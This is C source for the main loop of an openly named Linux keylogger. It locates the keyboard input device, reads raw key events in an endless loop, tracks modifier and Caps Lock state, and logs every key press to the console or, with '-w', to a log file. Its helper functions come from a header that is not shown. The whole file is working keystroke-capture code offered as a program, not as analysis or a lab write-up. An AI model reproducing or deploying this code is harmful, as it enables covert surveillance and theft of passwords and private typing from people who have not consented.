#include <dirent.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/input-event-codes.h>
#include <linux/input.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <unistd.h>

#include "keylogger.h"

int main(int argc, char *argv[]) {
    bool shift_pressed = false, ctrl_pressed = false, meta_pressed = false, alt_pressed = false,
         capslock_active = false, log_to_file = false;

    if (argc > 1 && strcmp(argv[1], "-w") == 0) {
        log_to_file = true;
    }

    char *keyboard_path = find_keyboard_device();
    if (!keyboard_path) {
        fprintf(stderr, "No keyboard device found\n");
        return EXIT_FAILURE;
    }

    printf("Using keyboard device: %s\n", keyboard_path);

    FILE *fp = NULL;
    if (log_to_file) {
        fp = fopen(LOG_FILE, "w");
        if (!fp) {
            fprintf(stderr, "Cannot open log file\n");
            return EXIT_FAILURE;
        }
    }

    int fd = open(keyboard_path, O_RDONLY);
    if (fd == -1) {
        fprintf(stderr, "Cannot open keyboard device: %s\n", strerror(errno));
        if (fp) fclose(fp);
        return EXIT_FAILURE;
    }

    struct input_event event;

    while (true) {
        ssize_t bytes_read = read(fd, &event, sizeof(event));
        if (bytes_read == sizeof(event)) {
            if (event.type == EV_KEY) {
                // Update status modifier keys
                if (event.code == KEY_LEFTSHIFT || event.code == KEY_RIGHTSHIFT) {
                    shift_pressed = event.value;
                } else if (event.code == KEY_LEFTCTRL || event.code == KEY_RIGHTCTRL) {
                    ctrl_pressed = event.value;
                } else if (event.code == KEY_LEFTMETA || event.code == KEY_RIGHTMETA) {
                    meta_pressed = event.value;
                } else if (event.code == KEY_LEFTALT || event.code == KEY_RIGHTALT) {
                    alt_pressed = event.value;
                }
                // Update Caps Lock status (toggle)
                if (event.code == KEY_CAPSLOCK && event.value == 1) {
                    capslock_active = !capslock_active;
                }
                // Handle key press
                if (event.value == 1) {
                    const char *key_name = get_key_name(event.code, shift_pressed, capslock_active);
                    if (strcmp(key_name, "UNKNOWN") != 0) {
                        log_key(fp, shift_pressed, ctrl_pressed, meta_pressed, alt_pressed, log_to_file, key_name);
                    }
                }
            }
        } else if (bytes_read == -1) {
            fprintf(stderr, "Error reading from keyboard device: %s\n", strerror(errno));
            break;
        }
    }

    close(fd);
    if (fp) fclose(fp);
    return EXIT_SUCCESS;
}
